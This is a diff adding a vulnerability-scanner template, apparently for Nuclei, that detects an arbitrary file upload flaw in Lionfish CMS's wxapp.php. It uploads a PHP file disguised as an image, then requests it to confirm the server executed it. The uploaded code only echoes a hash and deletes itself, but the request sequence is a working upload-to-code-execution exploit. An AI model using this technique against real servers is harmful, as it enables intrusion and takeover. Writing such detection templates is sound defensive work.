@@ -1,0 +1,57 @@
+id: szy-cms-wxapp-php-anyfile-upload
+info:
+  name: Lionfish CMS wxapp.php Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  dt: "{{date_time('2006-01-02')}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/wxapp.php?controller=Goods.doPageUpload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
+    body: |-
+      ------WebKitFormBoundary8UaANmWAgM4BqBSs
+      Content-Disposition: form-data; name="upfile"; filename="test.php"
+      Content-Type: image/gif
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundary8UaANmWAgM4BqBSs--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".php"
+          - "Uploads"
+          - "goods"
+        part: body
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "(?P<file>[0-9]{16}).php"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Uploads/image/goods/{{dt}}/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
